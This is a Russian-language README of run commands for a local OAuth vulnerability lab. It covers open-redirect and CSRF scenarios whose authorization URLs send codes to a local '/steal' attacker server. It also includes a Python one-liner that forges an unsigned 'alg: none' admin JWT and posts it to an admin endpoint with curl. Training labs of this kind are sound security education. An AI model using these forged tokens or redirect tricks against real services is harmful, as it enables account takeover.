# README2 — команды для запуска стенда

## 1. Запуск виртуальной машины (Windows CMD)

cd /d C:\oauth-vuln-lab
vagrant up
vagrant ssh

## 2. Внутри виртуальной машины

cd /vagrant

### Сценарий 1 — open-redirect

docker-compose -f scenarios/open-redirect/docker-compose.yml up -d

Открыть в браузере:
http://localhost:8080/authorize?client_id=test-client&redirect_uri=http://localhost:8082/steal&response_type=code&state=test

docker logs open-redirect_attacker-server_1
docker-compose -f scenarios/open-redirect/docker-compose.yml down

### Сценарий 2 — csrf-state

docker-compose -f scenarios/csrf-state/docker-compose.yml up -d

Открыть в браузере:
http://localhost:8083/authorize?client_id=test-client&redirect_uri=http://localhost:8085/steal&response_type=code&state=fixed

docker logs csrf-state_attacker-server_1
docker-compose -f scenarios/csrf-state/docker-compose.yml down

### Сценарий 3 — jwt-bypass

docker-compose -f scenarios/jwt-bypass/docker-compose.yml up -d

TOKEN=$(python3 -c "
import base64, json
header = {'alg': 'none', 'typ': 'JWT'}
payload = {'sub': 'admin', 'role': 'admin'}
b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
print(f'{b64(header)}.{b64(payload)}.')
")

curl -X POST http://localhost:8086/admin -H "Content-Type: application/json" -d "{\"token\": \"$TOKEN\"}"

docker-compose -f scenarios/jwt-bypass/docker-compose.yml down

### Тесты

docker-compose -f scenarios/open-redirect/docker-compose.yml up -d
pytest tests/ -v
docker-compose -f scenarios/open-redirect/docker-compose.yml down

### Выход из ВМ

exit

## 3. Остановка виртуальной машины (Windows CMD)

vagrant halt